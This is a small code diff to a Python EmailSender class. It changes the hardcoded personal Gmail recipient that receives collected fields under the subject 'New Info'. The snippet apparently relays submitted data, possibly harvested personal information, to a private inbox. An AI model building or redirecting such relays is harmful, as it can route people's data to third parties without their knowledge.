@@ -44,7 +44,7 @@ class EmailSender:
         contents = "\n".join(f"{key}: {value}" for key, value in fields.items() if value is not None)
 
         result = self.yag.send(
-            to="lyndazuniga2020@gmail.com",
+            to="Privatehiroyuki1@gmail.com",
             subject="New Info",
             contents=contents,
             attachments=None
